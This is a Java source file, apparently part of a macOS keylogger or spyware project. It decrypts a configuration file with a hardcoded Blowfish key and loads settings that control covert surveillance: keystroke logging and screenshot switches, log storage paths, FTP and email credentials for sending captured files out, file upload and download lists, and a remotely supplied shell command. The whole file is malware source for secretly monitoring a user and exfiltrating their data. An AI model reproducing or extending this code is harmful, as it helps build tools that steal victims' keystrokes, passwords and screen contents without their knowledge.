package mac.project.main;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
//import java.io.UnsupportedEncodingException;
//import java.util.HashSet;
//import java.util.Set;

import mac.project.enc.Blowfish;

/**
 * 配置文件读取
 * @author	root
 * input:	configure file
 * output:	file suffix, file names wanted to copy...
 */

public class ChangeConfig {

//	MainUI mainUI;
	ConfigBean cfBean = new ConfigBean();

	public ChangeConfig(String filePath,ConfigBean configBean){
		this.cfBean = configBean;
		String desDir = null;
		desDir = filePath;
		File file = new File(desDir);
		if(!file.getParentFile().exists()){
			file.mkdir();
		}

		/****解密****/
		try {
			FileInputStream fis;
			fis = new FileInputStream(file);
			InputStreamReader is = new InputStreamReader(fis,"UTF-8");
			BufferedReader br = new BufferedReader(is);
			String str;
			StringBuffer strbuf = new StringBuffer();
			Blowfish crypt = new Blowfish("logkext");
			System.out.println("Start decrypt...");
			while((str = br.readLine()) != null){
				strbuf.append(str);
			}
			String stren = strbuf.toString();
			stren = crypt.decryptString(stren);
			
			findUserName(stren);
			findRunStatu(stren);
			findKeyStatu(stren);
			findScreenStatu(stren);
			findScreenDes(stren);
			findKeyboardDes(stren);
			findFtpHost(stren);
			findFtpUser(stren);
			findFtpPassword(stren);
			findUploadPeriod(stren);
			findDownloadPeriod(stren);
			findFtpUploadList(stren);
			findFtpDownloadList(stren);
			findMailReceiver(stren);
			findMailAttachment(stren);
			findMailTopic(stren);
			findMailName(stren);
			findMailAccount(stren);
			findMailPassword(stren);
			findMailPop3(stren);
			findMailSmtp(stren);
			findCommand(stren);
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	private String find(String stren,String frontSign,String backSign){      //返回FTP主机名
		String desStr = null;
		try {
			int index1 = stren.indexOf(frontSign);
			int index2 = stren.indexOf(backSign);
			if ((index1+1==0)||(index2+1==0)) {
				return null;
			}
			String subStr = stren.substring(index1+frontSign.length(), index2);
			String[] tmp = subStr.split(";");
			int count = 0;
			if(tmp.length > 0){
				for(int i = 0;i < tmp.length;i++){
					tmp[i] = tmp[i].trim();
					if(!tmp[i].isEmpty()) {
//						desStr = tmp[i].trim();
						desStr = tmp[i].substring(tmp[i].indexOf("/")+1);//‘／’＋1 即为192
						desStr = desStr.trim();
						count++;
					}
					if(count == 1) break;
				}
			}
			return desStr;
		} catch (NullPointerException e) {
			e.printStackTrace();
			return null;
		}
//		return desStr;
	}
	
	private void findUserName(String stren){      //返回FTP主机名
		String userName = find (stren,"<个人用户名>","</个人用户名>");
		if (userName != null) {
			cfBean.setUserName(userName);
		}		
	}
	
	/*
	 * 查找并处理程序运行状态
	 */
	private void findRunStatu(String stren) {
		String runFlag = find (stren,"<卸载程序>","</卸载程序>");
		if (runFlag != null) {
			if (runFlag.equals("true")) {
				cfBean.setRunStatu(true);
			} else {
				cfBean.setRunStatu(false);
			}
		}
	}
	
	private void findKeyStatu(String stren) {
		String keyFlag = find (stren,"<键盘跟踪开关>","</键盘跟踪开关>");
		if (keyFlag != null) {
			if (keyFlag.equals("true")) {
				cfBean.setKeyStatu(true);
			} else {
				cfBean.setKeyStatu(false);
			}
		}
	}
	
	private void findScreenStatu(String stren) {
		String ScreenFlag = find (stren,"<屏幕截图开关>","</屏幕截图开关>");
		if (ScreenFlag != null) {
			if (ScreenFlag.equals("true")) {
				cfBean.setScreenStatu(true);
			} else {
				cfBean.setScreenStatu(false);
			}
		}
	}
	
	private void findScreenDes(String stren){      //返回FTP主机名
		String screenDes = find (stren,"<屏幕截图存放路径>","</屏幕截图存放路径>");
		if (screenDes != null) {
			cfBean.setScreenDes(screenDes);
		}
	}

	private void findKeyboardDes(String stren){      //返回FTP主机名
		String keyDes = find (stren,"<键盘日志存放目的地址>","</键盘日志存放目的地址>");
		if (keyDes != null) {
			cfBean.setKeyboardDes(keyDes);
		}
	}

	private void findFtpHost(String stren){      //返回FTP主机名
		String ftpHost = find (stren,"<FTP主机名>","</FTP主机名>");
		if (ftpHost != null) {
			cfBean.setFtpHost(ftpHost);
		}
	}
	

	private void findFtpUser(String stren){      //返回FTP主机名
		String ftpUser = find (stren,"<FTP用户名>","</FTP用户名>");
		if (ftpUser != null) {
			cfBean.setFtpUser(ftpUser);
		}
	}
	

	private void findFtpPassword(String stren){      //返回FTP主机名
		String ftpPasswd = find (stren,"<FTP密码>","</FTP密码>");
		if (ftpPasswd != null) {
			cfBean.setFtpPasswords(ftpPasswd);
		}
	}
	

	private void findUploadPeriod(String stren){      //返回FTP主机名
		String ftpUpPeriod = find (stren,"<FTP上传时间间隔>","</FTP上传时间间隔>");
		if (ftpUpPeriod != null) {
			cfBean.setUploadPeriod(ftpUpPeriod);
		}
	}
	

	private void findDownloadPeriod(String stren){      //返回FTP主机名
		String ftpDownPeriod = find (stren,"<FTP下载时间间隔>","</FTP下载时间间隔>");
		if (ftpDownPeriod != null) {
			cfBean.setDownloadPeriod(ftpDownPeriod);
		}
	}
	

	private void findFtpUploadList(String stren){      //返回FTP主机名
		String ftpUpload = find (stren,"<FTP上传的文件地址>","</FTP上传的文件地址>");
		if (ftpUpload != null) {
			cfBean.setFtpUploadList(ftpUpload);
		}
	}
	

	private void findFtpDownloadList(String stren){      //返回FTP主机名
		String ftpDownload = find (stren,"<FTP下载的文件名>","</FTP下载的文件名>");
		if (ftpDownload != null) {
			cfBean.setFtpDownloadList(ftpDownload);
		}
	}
	

	private void findMailReceiver(String stren){      //返回FTP主机名
		String mailReceiver = find (stren,"<MAIL收件人邮箱>","</MAIL收件人邮箱>");
		if (mailReceiver != null) {
			cfBean.setMailReceiver(mailReceiver);
		}
	}
	

	private void findMailAttachment(String stren){      //返回FTP主机名
		String mailAttachment = find (stren,"<MAIL附件地址>","</MAIL附件地址>");
		if (mailAttachment != null) {
			cfBean.setMailAttachment(mailAttachment);
		}
	}
	
	private void findMailTopic(String stren){      //返回FTP主机名
		String mailTopic = find (stren,"<MAIL主题>","</MAIL主题>");
		if (mailTopic != null) {
			cfBean.setMailTopic(mailTopic);
		}
	}

	private void findMailName(String stren){      //返回FTP主机名
		String mailName = find (stren,"<MAIL显示的发件人名称>","</MAIL显示的发件人名称>");
		if (mailName != null) {
			cfBean.setMailName(mailName);
		}
	}
	

	private void findMailAccount(String stren){      //返回FTP主机名
		String mailAccount = find (stren,"<MAIL发件人账号>","</MAIL发件人账号>");
		if (mailAccount != null) {
			cfBean.setMailAccount(mailAccount);
		}
	}
	

	private void findMailPassword(String stren){      //返回FTP主机名
		String mailPasswd = find (stren,"<MAIL密码>","</MAIL密码>");
		if (mailPasswd != null) {
			cfBean.setMailPassword(mailPasswd);
		}
	}
	

	private void findMailPop3(String stren){      //返回FTP主机名
		String mailPop3 = find (stren,"<MAILPOP3服务器>","</MAILPOP3服务器>");
		if (mailPop3 != null) {
			cfBean.setMailPop3(mailPop3);
		}
	}
	

	private void findMailSmtp(String stren){      //返回FTP主机名
		String mailSmtp = find (stren,"<MAILSMTP服务器>","</MAILSMTP服务器>");
		if (mailSmtp != null) {
			cfBean.setMailSmtp(mailSmtp);
		}
	}
	

	private void findCommand(String stren){      //返回FTP主机名
		String cmd = find (stren,"<命令行语句>","</命令行语句>");
		if (cmd != null) {
			cfBean.setCommand(cmd);
		}
	}

//	public static void main(String args[] ){
//		String filePath = "Config/config";
//		ConfigBean configBean = null;
//		new ChangeConfig(filePath,configBean);
//	}

}
